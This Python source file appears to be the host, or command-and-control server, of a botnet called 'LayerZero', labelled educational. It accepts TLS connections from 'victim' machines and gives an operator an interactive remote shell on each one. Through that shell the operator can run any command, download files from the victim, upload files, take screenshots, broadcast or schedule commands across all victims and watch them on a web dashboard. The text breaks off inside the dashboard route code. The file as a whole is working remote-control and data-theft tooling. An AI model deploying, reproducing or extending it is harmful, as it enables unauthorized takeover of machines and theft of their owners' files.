# ============================================================================================
# LIBRARY IMPORTS
# ============================================================================================

import socket       # Network communication
import json         # Data serialization
import base64       # Binary-to-text encoding for file transfers
import threading    # Concurrent execution
import ssl          # TLS/SSL encryption
import struct       # Binary data packing (message length headers)
import os           # OS interaction
import sys          # System utilities
import logging      # Debug/audit logging
import datetime     # Timestamps, scheduling
import hashlib      # Authentication hashing
import secrets      # Secure random tokens
import argparse     # CLI argument parsing
import time         # Sleep/timing utilities


# ============================================================================================
# COMMAND-LINE ARGUMENTS
# ============================================================================================

parser = argparse.ArgumentParser(description='LayerZero Botnet Host (Educational)')
parser.add_argument('--debug', action='store_true', help='Enable debug logging to logs/ folder')
parser.add_argument('--port', type=int, default=4444, help='Port to listen on (default: 4444)')
parser.add_argument('--web-port', type=int, default=8080, help='Web dashboard port (default: 8080)')
parser.add_argument('--no-web', action='store_true', help='Disable the web dashboard')
parser.add_argument('--auth-key', type=str, default=None, help='Shared secret key victims must provide to connect. If not set, no auth required.')
args = parser.parse_args()


# ============================================================================================
# LOGGING SETUP
# ============================================================================================

log_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs')
os.makedirs(log_dir, exist_ok=True)  # always create — used for both host.log and session transcripts

logger = logging.getLogger('botnet_host')
logger.setLevel(logging.DEBUG if args.debug else logging.WARNING)

console_handler = logging.StreamHandler()
console_handler.setLevel(logging.WARNING)
console_handler.setFormatter(logging.Formatter('[%(levelname)s] %(message)s'))
logger.addHandler(console_handler)

if args.debug:
    file_handler = logging.FileHandler(os.path.join(log_dir, 'host.log'))
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(logging.Formatter('%(asctime)s [%(levelname)s] %(message)s'))
    logger.addHandler(file_handler)


# ============================================================================================
# COLOR CODES
# ============================================================================================

GREEN  = '\033[92m'
YELLOW = '\033[93m'
RED    = '\033[91m'
CYAN   = '\033[96m'
RESET  = '\033[0m'


# ============================================================================================
# BANNER
# ============================================================================================

BANNER = r'''
 ____ ____ ____ ____ ____ _________ ____ ____ ____ ____
||L |||A |||Y |||E |||R |||       |||Z |||E |||R |||O ||
||__|||__|||__|||__|||__|||_______|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/_______\|/__\|/__\|/__\|/__\|
'''


# ============================================================================================
# CONSTANTS & PROTOCOL DEFINITIONS
# ============================================================================================
# Every message: [4-byte big-endian length][JSON payload]
#
# Host -> Victim:
#   {"type": "command",        "command": "<cmd>"}
#   {"type": "file_data",      "data": "<base64>"}
#   {"type": "auth_challenge", "challenge": "<hex>"}
#   {"type": "auth_result",    "success": true|false}
#   {"type": "ping"}
#
# Victim -> Host:
#   {"type": "response",  "data": "<string>"}
#   {"type": "error",     "message": "<string>"}
#   {"type": "auth",      "token": "<hex>"}
#   {"type": "heartbeat", "cwd": "...", "pid": N}
#   {"type": "sysinfo",   "data": {...}}

MAX_MESSAGE_SIZE = 50 * 1024 * 1024   # 50 MB max message size
HEADER_SIZE      = 4                   # 4-byte uint32 big-endian length prefix
RECV_CHUNK       = 4096                # Socket receive buffer
AUTH_TIMEOUT     = 10                  # Auth handshake timeout (seconds)
SOCKET_TIMEOUT   = 30                  # General socket timeout
HEARTBEAT_INTERVAL = 30                # Seconds between heartbeat checks

# Strict whitelist of valid victim -> host message types
VALID_VICTIM_MSG_TYPES = {'response', 'error', 'auth', 'heartbeat', 'sysinfo'}

# Hash auth key (never store plaintext in memory longer than needed)
AUTH_KEY_HASH = hashlib.sha256(args.auth_key.encode()).hexdigest() if args.auth_key else None

# Download directory for received files
DOWNLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'downloads')

# Session transcripts are written to log_dir (botnet/logs/) alongside host.log


# ============================================================================================
# TLS/SSL CONTEXT SETUP
# ============================================================================================

def create_ssl_context_host():
    """Create a TLS server context. Auto-generates a self-signed cert if none exists."""
    cert_dir  = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'certs')
    cert_file = os.path.join(cert_dir, 'host.crt')
    key_file  = os.path.join(cert_dir, 'host.key')

    if not os.path.exists(cert_file) or not os.path.exists(key_file):
        os.makedirs(cert_dir, exist_ok=True)
        print(YELLOW + '[*] Generating self-signed TLS certificate...' + RESET)
        logger.info('Generating self-signed TLS certificate')
        ret = os.system(
            f'openssl req -x509 -newkey rsa:2048 -keyout {key_file} '
            f'-out {cert_file} -days 365 -nodes '
            f'-subj "/CN=layerzero-botnet" 2>/dev/null'
        )
        if ret != 0 or not os.path.exists(cert_file):
            print(RED + '[-] Failed to generate TLS cert. Is openssl installed?' + RESET)
            print(YELLOW + '[*] Falling back to unencrypted communication.' + RESET)
            logger.warning('TLS cert generation failed, falling back to plaintext')
            return None

    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(cert_file, key_file)
        logger.info('TLS context created successfully')
        return context
    except ssl.SSLError as e:
        logger.error(f'Failed to create TLS context: {e}')
        print(RED + f'[-] TLS setup error: {e}' + RESET)
        return None


# ============================================================================================
# GLOBAL STATE
# ============================================================================================

# Each victim is a dict:
#   socket, ip, name, status, last_activity, connected_at, lock, in_shell
victims      = []
victims_lock = threading.Lock()         # Protects the victims list itself
stop_server  = False
sock         = None
ssl_context  = None

# Activity log for the web frontend (ring buffer, max 500 entries)
activity_log      = []
activity_log_lock = threading.Lock()
ACTIVITY_LOG_MAX  = 500


def log_activity(action, detail='', session=None):
    """Append an entry to the activity log (thread-safe)."""
    entry = {
        'time': datetime.datetime.now().isoformat(),
        'action': str(action),
        'detail': str(detail)[:500],
        'session': session,
    }
    with activity_log_lock:
        activity_log.append(entry)
        if len(activity_log) > ACTIVITY_LOG_MAX:
            activity_log.pop(0)


# ── Per-victim session transcript logging ────────────────────────────────────

DIVIDER = '-' * 72

def open_victim_log(victim_info):
    """Create a .txt transcript file for this victim in log_dir (botnet/logs/).
    The filename encodes the exact moment the victim connected.
    """
    if victim_info.get('log_file'):
        return
    # Use connect timestamp so filename == session start time
    connect_ts = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    victim_info['connect_ts'] = connect_ts
    name  = victim_info.get('name', 'unknown')
    safe  = ''.join(c if (c.isalnum() or c in '-_.') else '_' for c in name)
    fname = f'{connect_ts}_{safe}.txt'
    path  = os.path.join(log_dir, fname)
    try:
        f = open(path, 'w', encoding='utf-8', buffering=1)  # line-buffered
        ip = f"{victim_info['ip'][0]}:{victim_info['ip'][1]}"
        ts = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        f.write(f'LayerZero Botnet — Session Transcript\n')
        f.write(f'{DIVIDER}\n')
        f.write(f'  Session started : {ts}\n')
        f.write(f'  Victim name     : {name}\n')
        f.write(f'  Remote address  : {ip}\n')
        f.write(f'  OS              : {victim_info.get("os", "unknown")}\n')
        f.write(f'  Hostname        : {victim_info.get("hostname", "unknown")}\n')
        f.write(f'  Username        : {victim_info.get("username", "unknown")}\n')
        f.write(f'{DIVIDER}\n\n')
        victim_info['log_file'] = f
        victim_info['log_path'] = path
    except OSError as e:
        logger.warning(f'Could not open victim log: {e}')


def victim_log_cmd(victim_info, command, target='single'):
    """Write a sent-command block to the transcript."""
    f = victim_info.get('log_file')
    if not f:
        return
    ts = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        f.write(f'[{ts}]  TARGET: {target}\n')
        f.write(f'>>> {command}\n')
    except OSError:
        pass


def victim_log_resp(victim_info, output=None, error=None):
    """Write a response block to the transcript."""
    f = victim_info.get('log_file')
    if not f:
        return
    ts = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        if error:
            f.write(f'[{ts}]  STATUS: ERROR\n')
            f.write(f'<<< {error}\n')
        else:
            lines = (output or '').rstrip()
            f.write(f'[{ts}]  STATUS: OK\n')
            # indent each line of multi-line output by 4 spaces
            for line in lines.splitlines():
                f.write(f'<<< {line}\n')
            if not lines:
                f.write('<<< (no output)\n')
        f.write('\n')  # blank line between exchanges
    except OSError:
        pass


def close_victim_log(victim_info):
    """Write footer and close the transcript file."""
    f = victim_info.pop('log_file', None)
    if f:
        try:
            ts = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f'{DIVIDER}\n')
            f.write(f'  Session ended   : {ts}\n')
            f.write(f'{DIVIDER}\n')
            f.close()
        except OSError:
            pass


# Monotonic counter for unique default victim names
_victim_counter      = 0
_victim_counter_lock = threading.Lock()


def next_victim_id():
    """Return a monotonically increasing victim ID for default naming."""
    global _victim_counter
    with _victim_counter_lock:
        vid = _victim_counter
        _victim_counter += 1
    return vid


# ============================================================================================
# PROTOCOL: LENGTH-PREFIXED JSON MESSAGES
# ============================================================================================

def protocol_send(target_socket, data):
    """Send a length-prefixed JSON message. Returns True on success."""
    try:
        json_data = json.dumps(data).encode('utf-8')
        if len(json_data) > MAX_MESSAGE_SIZE:
            logger.warning(f'Message too large to send: {len(json_data)} bytes')
            return False
        header = struct.pack('>I', len(json_data))
        target_socket.sendall(header + json_data)
        return True
    except (BrokenPipeError, ConnectionResetError, OSError) as e:
        logger.debug(f'Send failed: {e}')
        return False


def protocol_receive(target_socket, timeout=SOCKET_TIMEOUT):
    """Receive a length-prefixed JSON message. Returns parsed dict or None."""
    try:
        target_socket.settimeout(timeout)

        # Read 4-byte header
        header = b''
        while len(header) < HEADER_SIZE:
            chunk = target_socket.recv(HEADER_SIZE - len(header))
            if not chunk:
                return None
            header += chunk

        msg_len = struct.unpack('>I', header)[0]

        if msg_len > MAX_MESSAGE_SIZE:
            logger.warning(f'Message size {msg_len} exceeds limit')
            return None
        if msg_len == 0:
            return None

        # Read exactly msg_len bytes
        data = b''
        while len(data) < msg_len:
            to_read = min(RECV_CHUNK, msg_len - len(data))
            chunk = target_socket.recv(to_read)
            if not chunk:
                return None
            data += chunk

        parsed = json.loads(data.decode('utf-8'))

        # Validate: must be dict with 'type'
        if isinstance(parsed, dict) and 'type' in parsed:
            if parsed['type'] not in VALID_VICTIM_MSG_TYPES:
                logger.warning(f'Invalid message type from victim: {parsed.get("type")}')
        return parsed

    except socket.timeout:
        logger.debug('Receive timed out')
        return None
    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        logger.debug(f'Receive connection error: {e}')
        return None
    except (json.JSONDecodeError, UnicodeDecodeError) as e:
        logger.warning(f'Malformed message: {e}')
        return None


def is_socket_alive(s):
    """Non-destructive check if a socket is still connected.
    Note: does NOT use MSG_PEEK because ssl.SSLSocket.recv raises ValueError
    when flags are non-zero. Instead we use a non-blocking recv and treat
    BlockingIOError / SSLWantReadError as 'alive'.
    """
    try:
        s.setblocking(False)
        try:
            data = s.recv(1)
            # recv returned 0 bytes → peer closed connection
            return bool(data)
        except BlockingIOError:
            return True      # No data ready, but socket is alive
        except ssl.SSLWantReadError:
            return True      # SSL layer needs a read — socket is alive
        except (ConnectionResetError, BrokenPipeError, OSError):
            return False
    except OSError:
        return False
    finally:
        try:
            s.setblocking(True)
        except OSError:
            pass


def safe_victim_send(victim_info, data):
    """Thread-safe send on a victim's socket. Returns True on success."""
    lock = victim_info.get('lock')
    if lock:
        with lock:
            return protocol_send(victim_info['socket'], data)
    return protocol_send(victim_info['socket'], data)


def safe_victim_receive(victim_info, timeout=SOCKET_TIMEOUT):
    """Thread-safe receive on a victim's socket. Returns parsed dict or None."""
    lock = victim_info.get('lock')
    if lock:
        with lock:
            return protocol_receive(victim_info['socket'], timeout)
    return protocol_receive(victim_info['socket'], timeout)


def safe_victim_command(victim_info, command_str, timeout=SOCKET_TIMEOUT):
    """Thread-safe: send a command and receive the response. Returns response dict or None."""
    lock = victim_info.get('lock')
    if lock:
        with lock:
            msg = {'type': 'command', 'command': command_str}
            if not protocol_send(victim_info['socket'], msg):
                return None
            return protocol_receive(victim_info['socket'], timeout)
    else:
        msg = {'type': 'command', 'command': command_str}
        if not protocol_send(victim_info['socket'], msg):
            return None
        return protocol_receive(victim_info['socket'], timeout)


# ============================================================================================
# HELP MENUS
# ============================================================================================

def show_center_help():
    print(YELLOW + "\n╔══════════════════════════════════════════════════════════════════╗")
    print("║                    COMMAND CENTER - HELP MENU                    ║")
    print("╚══════════════════════════════════════════════════════════════════╝" + RESET)
    print(GREEN + "\nAvailable Commands:" + RESET)
    print(YELLOW + "  targets" + RESET + "              - List all victims with status")
    print(YELLOW + "  session <#>" + RESET + "          - Control a specific victim (e.g., 'session 0')")
    print(YELLOW + "  name <#> <name>" + RESET + "      - Name a session (e.g., 'name 0 WebServer')")
    print(YELLOW + "  sendall <cmd>" + RESET + "        - Send a command to ALL connected victims")
    print(YELLOW + "  schedule <#> <HH:MM> <cmd>" + RESET + " - Schedule a command for a time")
    print(YELLOW + "  schedules" + RESET + "            - List pending scheduled tasks")
    print(YELLOW + "  clear" + RESET + "                - Remove disconnected sessions from list")
    print(YELLOW + "  debug" + RESET + "                - Toggle debug logging on/off")
    print(YELLOW + "  help" + RESET + "                 - Show this help menu")
    print(YELLOW + "  quit" + RESET + "                 - Close all connections and exit\n")


def show_shell_help():
    print(YELLOW + "\n╔══════════════════════════════════════════════════════════════════╗")
    print("║                      VICTIM SHELL - HELP MENU                    ║")
    print("╚══════════════════════════════════════════════════════════════════╝" + RESET)
    print(GREEN + "\nAvailable Commands:" + RESET)
    print(YELLOW + "  <any command>" + RESET + "   - Run any system command (e.g., 'ls', 'pwd', 'whoami')")
    print(YELLOW + "  cd [path]" + RESET + "       - Change directory (no path = home directory)")
    print(YELLOW + "  download <file>" + RESET + " - Download a file from the victim")
    print(YELLOW + "  upload <file>" + RESET + "   - Upload a file to the victim")
    print(YELLOW + "  sysinfo" + RESET + "         - Get victim system information")
    print(YELLOW + "  screenshot" + RESET + "      - Capture victim's screen (if available)")
    print(YELLOW + "  help" + RESET + "            - Show this help menu")
    print(YELLOW + "  back" + RESET + "            - Return to Command Center (victim stays alive)")
    print(YELLOW + "  exit" + RESET + "            - Disconnect the victim\n")


# ============================================================================================
# FUNCTION: send_to_all
# ============================================================================================

def send_to_all(command_str):
    """Send a command to all connected victims (thread-safe per-victim).
    Returns list of (index, response_dict_or_None) tuples."""
    results = []
    with victims_lock:
        victim_snapshot = list(enumerate(victims))

    for i, victim in victim_snapshot:
        if victim['status'] != 'connected' or victim.get('in_shell'):
            results.append((i, None))
            continue
        if not is_socket_alive(victim['socket']):
            victim['status'] = 'disconnected'
            results.append((i, None))
            continue

        resp = safe_victim_command(victim, command_str, timeout=10)
        victim['last_activity'] = datetime.datetime.now().isoformat()
        if resp is None:
            victim['status'] = 'disconnected'
        results.append((i, resp))

    return results


# ============================================================================================
# FUNCTION: run  (interactive victim shell)
# ============================================================================================

def run(victim_info):
    """Interactive shell for controlling a single victim."""
    target = victim_info['socket']
    ip     = victim_info['ip']
    name   = victim_info.get('name', 'unnamed')
    vlock  = victim_info.get('lock', threading.Lock())

    # Mark that this victim is being actively controlled (prevents scheduler/sendall conflicts)
    victim_info['in_shell'] = True

    print(GREEN + f'\n[+] Connected to Session "{name}" at {ip[0]}:{ip[1]}' + RESET)
    print(YELLOW + "[+] Type 'help' for commands, 'back' to return" + RESET)
    logger.info(f'Entered shell for victim {ip} ({name})')

    try:
        while True:
            try:
                command = input(f'Shell#{ip[0]}: ')
            except (EOFError, KeyboardInterrupt):
                print()
                break

            command = command.strip()
            if not command:
                continue

            if command == 'help':
                show_shell_help()
                continue

            if command == 'back':
                print(YELLOW + '[+] Returning to Command Center...' + RESET)
                logger.info(f'Detached from victim {ip}')
                break

            # Check socket before every send
            if not is_socket_alive(target):
                print(RED + '[-] Victim has disconnected.' + RESET)
                victim_info['status'] = 'disconnected'
                logger.warning(f'Victim {ip} disconnected unexpectedly')
                break

            # --- EXIT ---
            if command == 'exit':
                with vlock:
                    protocol_send(target, {'type': 'command', 'command': 'exit'})
                print(YELLOW + '[!] Closing victim connection...' + RESET)
                victim_info['status'] = 'disconnected'
                logger.info(f'Sent exit to victim {ip}')
                break

            # --- CD ---
            elif command == 'cd' or command.startswith('cd '):
                with vlock:
                    if not protocol_send(target, {'type': 'command', 'command': command}):
                        print(RED + '[-] Send failed. Victim may have disconnected.' + RESET)
                        victim_info['status'] = 'disconnected'
                        break
                    response = protocol_receive(target)
                victim_info['last_activity'] = datetime.datetime.now().isoformat()
                if response is None:
                    print(RED + '[-] No response. Victim may have disconnected.' + RESET)
                    victim_info['status'] = 'disconnected'
                    break
                if response.get('type') == 'error':
                    print(RED + f'[-] Victim error: {response.get("message", "Unknown")}' + RESET)
                elif response.get('type') == 'response' and response.get('data'):
                    print(response['data'])

            # --- SYSINFO ---
            elif command == 'sysinfo':
                with vlock:
                    if not protocol_send(target, {'type': 'command', 'command': 'sysinfo'}):
                        print(RED + '[-] Send failed.' + RESET)
                        victim_info['status'] = 'disconnected'
                        break
                    response = protocol_receive(target, timeout=15)
                victim_info['last_activity'] = datetime.datetime.now().isoformat()
                if response is None:
                    print(RED + '[-] No response.' + RESET)
                    victim_info['status'] = 'disconnected'
                    break
                if response.get('type') == 'sysinfo':
                    info = response.get('data', {})
                    print(CYAN + '\n  ── System Information ──' + RESET)
                    for k, v in info.items():
                        print(f'  {YELLOW}{k:<16}{RESET} {v}')
                    print()
                elif response.get('type') == 'error':
                    print(RED + f'[-] Victim error: {response.get("message")}' + RESET)
                else:
                    print(YELLOW + f'[*] Received: {response}' + RESET)

            # --- SCREENSHOT ---
            elif command == 'screenshot':
                with vlock:
                    if not protocol_send(target, {'type': 'command', 'command': 'screenshot'}):
                        print(RED + '[-] Send failed.' + RESET)
                        victim_info['status'] = 'disconnected'
                        break
                    response = protocol_receive(target, timeout=30)
                victim_info['last_activity'] = datetime.datetime.now().isoformat()
                if response is None:
                    print(RED + '[-] No response.' + RESET)
                    victim_info['status'] = 'disconnected'
                    break
                if response.get('type') == 'error':
                    print(RED + f'[-] Victim error: {response.get("message")}' + RESET)
                elif response.get('type') == 'response':
                    try:
                        os.makedirs(DOWNLOAD_DIR, exist_ok=True)
                        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
                        fname = f'screenshot_{name}_{ts}.png'
                        fpath = os.path.join(DOWNLOAD_DIR, fname)
                        file_data = base64.b64decode(response['data'])
                        with open(fpath, 'wb') as f:
                            f.write(file_data)
                        print(GREEN + f'[+] Screenshot saved: {fpath}' + RESET)
                        logger.info(f'Screenshot from {ip} saved to {fpath}')
                    except Exception as e:
                        print(RED + f'[-] Failed to save screenshot: {e}' + RESET)

            # --- DOWNLOAD ---
            elif command.startswith('download '):
                filename = command[9:].strip()
                if not filename:
                    print(RED + '[-] Usage: download <filename>' + RESET)
                    continue
                with vlock:
                    if not protocol_send(target, {'type': 'command', 'command': command}):
                        print(RED + '[-] Send failed.' + RESET)
                        victim_info['status'] = 'disconnected'
                        break
                    response = protocol_receive(target, timeout=60)
                victim_info['last_activity'] = datetime.datetime.now().isoformat()
                if response is None:
                    print(RED + '[-] No response. Victim may have disconnected.' + RESET)
                    victim_info['status'] = 'disconnected'
                    break
                if response.get('type') == 'error':
                    print(RED + f'[-] Victim error: {response.get("message")}' + RESET)
                elif response.get('type') == 'response':
                    try:
                        os.makedirs(DOWNLOAD_DIR, exist_ok=True)
                        local_name = os.path.basename(filename)
                        fpath = os.path.join(DOWNLOAD_DIR, local_name)
                        file_data = base64.b64decode(response['data'])
                        with open(fpath, 'wb') as f:
                            f.write(file_data)
                        print(GREEN + f'[+] Downloaded: {fpath}' + RESET)
                        logger.info(f'Downloaded {filename} from {ip} -> {fpath}')
                    except Exception as e:
                        print(RED + f'[-] Download decode failed: {e}' + RESET)
                        logger.error(f'Download decode error: {e}')

            # --- UPLOAD ---
            elif command.startswith('upload '):
                filepath = command[7:].strip()
                if not filepath:
                    print(RED + '[-] Usage: upload <filename>' + RESET)
                    continue
                if not os.path.isfile(filepath):
                    print(RED + f'[-] File not found: {filepath}' + RESET)
                    continue
                with vlock:
                    if not protocol_send(target, {'type': 'command', 'command': command}):
                        print(RED + '[-] Send failed.' + RESET)
                        victim_info['status'] = 'disconnected'
                        break
                    try:
                        with open(filepath, 'rb') as f:
                            file_bytes = f.read()
                        file_msg = {'type': 'file_data', 'data': base64.b64encode(file_bytes).decode('utf-8')}
                        if not protocol_send(target, file_msg):
                            print(RED + '[-] Failed to send file data.' + RESET)
                            victim_info['status'] = 'disconnected'
                            break
                        response = protocol_receive(target, timeout=30)
                    except Exception as e:
                        print(RED + f'[-] Upload failed: {e}' + RESET)
                        logger.error(f'Upload error: {e}')
                        continue
                victim_info['last_activity'] = datetime.datetime.now().isoformat()
                if response and response.get('type') == 'response':
                    print(GREEN + f'[+] Uploaded: {filepath}' + RESET)
                    logger.info(f'Uploaded {filepath} to {ip}')
                elif response and response.get('type') == 'error':
                    print(RED + f'[-] Victim error: {response.get("message")}' + RESET)
                else:
                    print(RED + '[-] No confirmation from victim.' + RESET)

            # --- ANY OTHER COMMAND ---
            else:
                with vlock:
                    if not protocol_send(target, {'type': 'command', 'command': command}):
                        print(RED + '[-] Send failed. Victim may have disconnected.' + RESET)
                        victim_info['status'] = 'disconnected'
                        break
                    response = protocol_receive(target)
                victim_info['last_activity'] = datetime.datetime.now().isoformat()
                if response is None:
                    print(RED + '[-] No response. Victim may have disconnected.' + RESET)
                    victim_info['status'] = 'disconnected'
                    break
                if response.get('type') == 'error':
                    print(RED + f'[-] Victim error: {response.get("message")}' + RESET)
                elif response.get('type') == 'response':
                    data = response.get('data', '')
                    if data:
                        print(data)
                    else:
                        print(YELLOW + '[*] Command executed (no output)' + RESET)
                else:
                    print(YELLOW + f'[*] Unexpected: {response}' + RESET)
    finally:
        victim_info['in_shell'] = False


# ============================================================================================
# AUTHENTICATION
# ============================================================================================

def authenticate_victim(client_socket):
    """Challenge-response auth. Returns True if OK (or auth disabled)."""
    if AUTH_KEY_HASH is None:
        return True

    try:
        challenge = secrets.token_hex(16)
        if not protocol_send(client_socket, {'type': 'auth_challenge', 'challenge': challenge}):
            return False

        response = protocol_receive(client_socket, timeout=AUTH_TIMEOUT)
        if response is None:
            logger.warning('Auth: No response')
            return False
        if not isinstance(response, dict) or response.get('type') != 'auth':
            logger.warning(f'Auth: Bad response type: {response}')
            return False

        expected = hashlib.sha256((args.auth_key + challenge).encode()).hexdigest()
        received = response.get('token', '')

        if not isinstance(received, str) or len(received) != 64:
            logger.warning('Auth: Invalid token format')
            return False

        if secrets.compare_digest(expected, received):
            protocol_send(client_socket, {'type': 'auth_result', 'success': True})
            logger.info('Auth: Success')
            return True
        else:
            protocol_send(client_socket, {'type': 'auth_result', 'success': False})
            logger.warning('Auth: Bad key')
            return False
    except Exception as e:
        logger.error(f'Auth error: {e}')
        return False


# ============================================================================================
# BACKGROUND SERVER (connection listener)
# ============================================================================================

def server():
    """Accepts new victim connections in a loop."""
    global stop_server

    while not stop_server:
        try:
            sock.settimeout(1)
            client_socket, addr = sock.accept()

            # TLS
            if ssl_context:
                try:
                    client_socket = ssl_context.wrap_socket(client_socket, server_side=True)
                    logger.info(f'TLS handshake OK: {addr}')
                except ssl.SSLError as e:
                    logger.warning(f'TLS failed for {addr}: {e}')
                    try:
                        client_socket.close()
                    except OSError:
                        pass
                    continue

            # Auth
            if not authenticate_victim(client_socket):
                print(RED + f'\n[-] Rejected unauthenticated victim: {addr}' + RESET)
                logger.warning(f'Rejected: {addr}')
                try:
                    client_socket.close()
                except OSError:
                    pass
                continue

            vid = next_victim_id()
            now = datetime.datetime.now().isoformat()
            victim_info = {
                'socket': client_socket,
                'ip': addr,
                'name': f'victim-{vid}',
                'status': 'connected',
                'last_activity': now,
                'connected_at': now,
                'lock': threading.Lock(),   # Per-victim socket lock
                'in_shell': False,          # True when a user is in interactive shell
            }

            with victims_lock:
                victims.append(victim_info)

            # Read the spontaneous sysinfo the victim sends right on connect.
            # Short timeout — if nothing arrives we proceed normally.
            try:
                init_msg = protocol_receive(client_socket, timeout=3)
                if init_msg and init_msg.get('type') == 'sysinfo':
                    sysdata = init_msg.get('data', {})
                    victim_info['os']       = sysdata.get('os', '?')
                    victim_info['hostname'] = sysdata.get('hostname', '')
                    victim_info['username'] = sysdata.get('username', '')
            except Exception:
                pass

            # Open the per-session transcript now that sysinfo fields are populated.
            open_victim_log(victim_info)
            victim_log_cmd(victim_info, '(session connected)', target='system')
            victim_log_resp(victim_info, output='Connection established')

            print(GREEN + f'\n[+] Victim connected: {addr[0]}:{addr[1]} (victim-{vid}) — OS: {victim_info.get("os", "?")}'  + RESET)
            logger.info(f'Connected: {addr} as victim-{vid}')
            log_activity('connect', f'{addr[0]}:{addr[1]}', session=f'victim-{vid}')

        except socket.timeout:
            continue
        except OSError:
            if stop_server:
                break
            continue


# ============================================================================================
# HEARTBEAT MONITOR
# ============================================================================================

def heartbeat_thread():
    """Periodically pings each connected victim to detect stale connections."""
    global stop_server

    while not stop_server:
        time.sleep(HEARTBEAT_INTERVAL)
        with victims_lock:
            snapshot = [(i, v) for i, v in enumerate(victims)
                        if v['status'] == 'connected' and not v.get('in_shell')]

        for i, victim in snapshot:
            lock = victim.get('lock')
            if lock and lock.locked():
                continue  # Someone else is using this socket right now
            try:
                with lock:
                    if not protocol_send(victim['socket'], {'type': 'ping'}):
                        victim['status'] = 'disconnected'
                        logger.info(f'Heartbeat: victim {victim["ip"]} marked disconnected (send fail)')
                        continue
                    resp = protocol_receive(victim['socket'], timeout=10)
                if resp and resp.get('type') == 'heartbeat':
                    victim['last_activity'] = datetime.datetime.now().isoformat()
                    if resp.get('os') and not victim.get('os'):
                        victim['os'] = resp['os']
                    logger.debug(f'Heartbeat OK: {victim["name"]}')
                elif resp is None:
                    victim['status'] = 'disconnected'
                    victim_log_cmd(victim, '(session ended — heartbeat timeout)', target='system')
                    close_victim_log(victim)
                    logger.info(f'Heartbeat: {victim["name"]} no response, marked disconnected')
                    log_activity('disconnect', 'heartbeat timeout', session=victim['name'])
            except Exception as e:
                victim['status'] = 'disconnected'
                logger.debug(f'Heartbeat error for {victim["name"]}: {e}')


# ============================================================================================
# SCHEDULED COMMANDS
# ============================================================================================

scheduled_tasks = []
scheduled_lock  = threading.Lock()


def scheduler_thread():
    """Executes scheduled commands when their time arrives."""
    global stop_server

    while not stop_server:
        now = datetime.datetime.now()
        with scheduled_lock:
            remaining = []
            to_run = []
            for task in scheduled_tasks:
                if now >= task['run_at']:
                    to_run.append(task)
                else:
                    remaining.append(task)
            scheduled_tasks.clear()
            scheduled_tasks.extend(remaining)

        # Execute outside scheduled_lock to avoid holding two locks
        for task in to_run:
            idx = task['victim_index']
            cmd = task['command']

            # idx == -1 means broadcast to all sessions
            if idx == -1:
                responses = send_to_all(cmd)
                for vi, resp in responses:
                    with victims_lock:
                        vname = victims[vi].get('name', f'Session {vi}') if vi < len(victims) else str(vi)
                    if resp and resp.get('type') == 'response':
                        print(CYAN + f'\n[SCHEDULED ALL] {vname} $ {cmd}' + RESET)
                        if resp.get('data'):
                            print(resp['data'])
                    else:
                        print(RED + f'\n[SCHEDULED ALL] {vname}: No response or error' + RESET)
                continue

            with victims_lock:
                if not (0 <= idx < len(victims)):
                    print(RED + f'\n[SCHEDULED] Invalid session: {idx}' + RESET)
                    continue
                v = victims[idx]
                display_name = v.get('name', f'Session {idx}')

            if v['status'] != 'connected' or v.get('in_shell'):
                print(RED + f'\n[SCHEDULED] {display_name}: not available (in_shell={v.get("in_shell")}, status={v["status"]})' + RESET)
                continue
            if not is_socket_alive(v['socket']):
                v['status'] = 'disconnected'
                print(RED + f'\n[SCHEDULED] {display_name}: disconnected' + RESET)
                continue

            resp = safe_victim_command(v, cmd, timeout=10)
            v['last_activity'] = datetime.datetime.now().isoformat()
            if resp and resp.get('type') == 'response':
                print(CYAN + f'\n[SCHEDULED] {display_name} $ {cmd}' + RESET)
                if resp.get('data'):
                    print(resp['data'])
            elif resp and resp.get('type') == 'error':
                print(RED + f'\n[SCHEDULED ERROR] {display_name}: {resp.get("message")}' + RESET)
            else:
                print(RED + f'\n[SCHEDULED] {display_name}: No response' + RESET)
            logger.info(f'Scheduled "{cmd}" executed on session {idx}')

        time.sleep(1)


# ============================================================================================
# WEB DASHBOARD
# ============================================================================================

DASHBOARD_HTML_FALLBACK = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard Error</title>
</head>
<body style="font-family:sans-serif;padding:40px;background:#fff;color:#000;">
    <h2>&#9888; Dashboard Failed to Load</h2>
    <p><code>web_dashboard/index.html</code> was not found next to <code>host.py</code>.</p>
    <p>Make sure the <code>botnet/web_dashboard/</code> folder exists, then restart the host.</p>
</body>
</html>'''

def html_escape(s):
    """Escape a string for safe HTML insertion."""
    return (str(s)
            .replace('&', '&amp;')
            .replace('<', '&lt;')
            .replace('>', '&gt;')
            .replace('"', '&quot;')
            .replace("'", '&#x27;'))


def start_web_dashboard(port):
    """Start Flask web dashboard. Returns server object or None."""
    try:
        from flask import Flask, render_template_string, request, jsonify, send_file
    except ImportError:
        print(YELLOW + '[*] Flask not installed. Web dashboard disabled.' + RESET)
        print(YELLOW + '    Install with: pip install flask' + RESET)
        logger.warning('Flask not installed')
        return None

    app = Flask(__name__)
    app.logger.setLevel(logging.ERROR)
    logging.getLogger('werkzeug').setLevel(logging.ERROR)

    # Path to the external frontend HTML file
    FRONTEND_DIR = os.path.dirname(os.path.abspath(__file__))
    FRONTEND_FILE = os.path.join(FRONTEND_DIR, 'web_dashboard', 'index.html')

    @app.route('/')
    def dashboard():
        if os.path.exists(FRONTEND_FILE):
            return send_file(FRONTEND_FILE)
        return render_template_string(DASHBOARD_HTML_FALLBACK)

    @app.route('/web_dashboard/<path:filename>')
    def web_dashboard_static(filename):
